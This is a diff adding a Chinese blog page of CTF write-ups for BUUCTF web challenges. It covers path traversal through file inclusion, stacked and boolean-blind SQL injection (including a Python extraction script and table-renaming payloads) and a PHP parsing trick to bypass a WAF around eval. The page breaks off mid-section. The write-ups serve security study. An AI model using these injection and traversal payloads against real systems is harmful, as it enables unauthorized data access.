@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="FXXY">
+
+
+    <meta name="subtitle" content="fxxy's blog">
+
+
+
+
+<title>BUUctf平台 | fxxy&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">fxxy&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">fxxy&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BUUctf平台</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-10&nbsp;&nbsp;00:00:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>f12源码看到source.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;	<span class="comment">//声明白名单为source.php hint.php</span></span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			</span><br><span class="line">            <span class="comment">//截取file字段中，开头到出现?的部分</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="comment">//？在file字段中首次出现的位置</span></span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先搞清楚代码，$_REQUEST[‘file’]获取请求中的file查询参数，然后用checkFile()进行检查，是否是hint.php或者source.php，若是这两个php则输出相应内容</p>
+<p>利用点在这2个地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="comment">//？在file字段中首次出现的位置</span></span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>mb_substr()：对字符串进行截取</li>
+<li>mb_strpos()：查找指定字符串在被查找字符串中<strong>第一次</strong>出现的位置，注意噢！是第一次出现的位置，而且在查找时，他会自动给原字符串的末尾加上?</li>
+</ul>
+<p>在本地写个demo看一下</p>
+<p>正常时：</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702202408302.png" alt="image-20200702202408302"></p>
+<p>不正常时：</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702202454771.png" alt="image-20200702202454771"></p>
+<p>也就是说，不管我后面会加多少个问号，多少个参数，他最终截取出来比对的，只会是第一个?出现之前的内容，这里可以这样绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;source.php?payload</span><br></pre></td></tr></table></figure>
+
+<p>然后hint.php中说，flag在ffffllllaaaagggg中，下面依次向上便利目录</p>
+<p>在第四次的时候出来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702203034782.png" alt=""></p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><ul>
+<li><p>注入点:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;07494cc4-964e-492d-82b1-180e7cc2beef.node3.buuoj.cn&#x2F;?inject&#x3D;1&#39; -- -</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字段值为2</p>
+</li>
+</ul>
+<p>但是过滤了一些东西，过滤了select，update，delete，drop，insert，where且大小写绕不过</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702204750850.png" alt="image-20200702204750850"></p>
+<ul>
+<li>用报错注入试试获取数据库和用户<ul>
+<li>数据库：supersqli</li>
+<li>用户：root@localhost</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702210831939.png" alt="image-20200702210831939"></p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702210800425.png" alt="image-20200702210800425"></p>
+<p>过滤了很多关键词，下面不知道怎么办了，然后在山师傅的提醒下，用了堆叠注入。</p>
+<p>获取数据库</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092133502.png" alt="image-20200703092133502"></p>
+<ul>
+<li>获取数据表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn&#x2F;?inject&#x3D;1&#39; ; use supersqli; show tables; -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092257405.png" alt="image-20200703092257405"></p>
+<ul>
+<li>获取字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn&#x2F;?inject&#x3D;1&#39; ; use supersqli; show columns from words -- -</span><br><span class="line">http:&#x2F;&#x2F;c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn&#x2F;?inject&#x3D;1&#39; ; use supersqli; show columns from &#96;1919810931114514&#96; -- -</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092953775.png" alt="image-20200703092953775"></p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703093224292.png" alt="image-20200703093224292"></p>
+<p>flag肯定是在1919810931114514这个表里面，但是过滤select又不知道该咋办了，看了一下WP，一种方法是置换表名和列名，因为正常查询的语句肯定为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from word where id &#x3D; &#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>那如果我们把存有flag的表名换成word就可用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span><span class="string">` 1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>); <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>过滤字符</p>
+<ul>
+<li>“ and or order union like</li>
+</ul>
+<p>堆叠注入</p>
+<ul>
+<li><p>获取数据库</p>
+<ul>
+<li>test</li>
+<li>ctftraining</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;1;show databases;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ul>
+<p>  <img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/vxvcs.png" alt="vxvcs"></p>
+<p>本来想一个一个试一下每个数据库中都有哪些表的，但是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;1;use test;show tables;</span><br></pre></td></tr></table></figure>
+
+<p>这个语句不能执行，那就show一下当前这个数据库有什么表叭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;1;show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/%7B5_%XG6MTWCGL8%7D0DE2M8JF.png" alt="{5_%XG6MTWCGL8}0DE2M8JF"></p>
+<p>尝试获取列名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from falg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/dsvc.png" alt="dsvc"></p>
+<p>又被过滤了。。。</p>
+<p>思考：flag表就在这个数据库下面，说明我们要的东西就在这里，前面测试的时候，不管输入的query是多少，输出的都只有1猜测后端的sql语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from flag</span><br></pre></td></tr></table></figure>
+
+<p>我们想得到flag表的内容的话，语句应该为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from flag</span><br></pre></td></tr></table></figure>
+
+<p>构造一下，query=*,1这样语句就会变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 from flag</span><br></pre></td></tr></table></figure>
+
+<p>然后成功得到flag</p>
+<p>错误</p>
+<p>官方WP里的做法是这样的，用了一个sql_mode变量，本来的查询语句应为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $POST[<span class="string">'query'</span>] || flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure>
+
+<p>正常的话，他应该是这样</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704110544795.png" alt="image-20200704110544795"></p>
+<p>而且前面测试的时候发现，有黑名单过滤输入字符串时会出错，而且输入的正确的东西时，回显的永远是1，那这样上面那个语句也说的通了，如何利用？</p>
+<p>mysql中有个sql_mode变量，这个变量有个值，是pipes_as_concat。意思就是将管道符当作连接符，将给定的字符拼接到查询的变量，测试一下</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704111028698.png" alt="image-20200704111028698"></p>
+<p>所以，正确解法应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704111234900.png" alt="image-20200704111234900"></p>
+<p>可以看到对1进行了拼接。</p>
+<h2 id="极客大挑战-easysql"><a href="#极客大挑战-easysql" class="headerlink" title="极客大挑战 easysql"></a>极客大挑战 easysql</h2><p>注入点在username参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; or 1&#x3D;1 order by 4 -- -</span><br></pre></td></tr></table></figure>
+
+
+
+<p>字段数：3</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/sdf.png" alt="sdf"></p>
+<p>一番测试发现布尔盲注</p>
+<p>写脚本注出数据库为geek</p>
+<ul>
+<li>数据库名</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703165141291.png" alt="image-20200703165141291"></p>
+<ul>
+<li>表名</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703165910808.png" alt="image-20200703165910808"></p>
+<p>后来用这个geekusser注列名的时候，折腾了好久都没有，然后在浏览器进行测试的时候，一不小小出来了。。。我把表名改成了geekuser</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn&#x2F;check.php?username&#x3D;1&#39; or 1&#x3D;1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;geekuser&#39; limit 0,1),1,1))&lt;125,1,0) -- - &amp;password&#x3D;1&#39; or 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703175931749.png" alt="image-20200703175931749"></p>
+<p>那让我们正常注一下</p>
+<ul>
+<li>列名<ul>
+<li>id</li>
+<li>username</li>
+<li>password</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703180105904.png" alt="image-20200703180105904"></p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">zidian = <span class="string">'sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\;&#123;$%&amp;*()&#125;'</span></span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli/Less-6/?id=1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_res</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> zidian:</span><br><span class="line">            </span><br><span class="line">            print(j)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据库名</span></span><br><span class="line">            <span class="comment">#payload = "http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1' or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- -&amp;password=1' or 1=1  ".format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据表名 控制limit获取其他表</span></span><br><span class="line">            <span class="comment">#payload = "http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1' or 1=1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- - &amp;password=1' or 1=1  ".format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#获取字段名</span></span><br><span class="line">            <span class="comment">#payload = "http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1' or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name='geekuser' limit 3,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1' or 1=1".format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取字段值</span></span><br><span class="line">            payload = <span class="string">"http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1' or 1=1 and if(ascii(substr((select password from geekuser limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0)  -- - &amp;password=1' or 1=1"</span>.format(i,ord(j))</span><br><span class="line">            </span><br><span class="line">            print(payload)</span><br><span class="line">            flag = requests.get(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> flag.text:</span><br><span class="line">                result = result + j</span><br><span class="line">                print(result)</span><br><span class="line"></span><br><span class="line">    print(result)</span><br><span class="line">            <span class="comment">#return result</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(get_res())</span><br><span class="line"><span class="comment"># payload = 'http://127.0.0.1/sqli/Less-6/?id=1" and if(ascii(substr((select database()),1,1))=115,1,0) -- -'</span></span><br><span class="line"><span class="comment"># flag = requests.get(payload)</span></span><br><span class="line"><span class="comment"># print(flag.text)</span></span><br><span class="line"><span class="comment"># if "You are in" in flag.text:</span></span><br><span class="line"><span class="comment">#     #dbname += j</span></span><br><span class="line"><span class="comment">#     print(45678)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>表面上是个计算题。。</p>
+<p>看源码发现有个calc.php</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703182146359.png" alt="image-20200703182146359"></p>
+<p>访问一下，看到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有个eval函数！！！但是要绕过前面的限制，num变量中不能包含空格、斜杠等</p>
+<p>而且，测试了一下，当num变量为字符串时，会forbidden。。原网页代码中有句话，有waf。。</p>
+<p>不会了，看了一下网上的WP，知道了一个PHP解析漏洞。</p>
+<h3 id="php解析漏洞"><a href="#php解析漏洞" class="headerlink" title="php解析漏洞"></a>php解析漏洞</h3><ul>
+<li>当PHP将查询字符串（在URL或正文中）转换为内部$_GET[‘’]或$__POST[]关联数组时，在将查询字符串进行解析时，会将某些字符删除或用下划线替代，也就是说，当输入 %20num  (%20为空格的URL编码)时，在PHP进行解析时，会自动解析为num</li>
+<li>例子1</li>
+</ul>
+<p>test.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $str &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">  echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703190119747.png" alt="image-20200703190119747"></p>
+<p>参见文章：<a href="https://www.anquanke.com/post/id/181682" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181682</a></p>
+<p>现在我们有绕过WAF的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
+
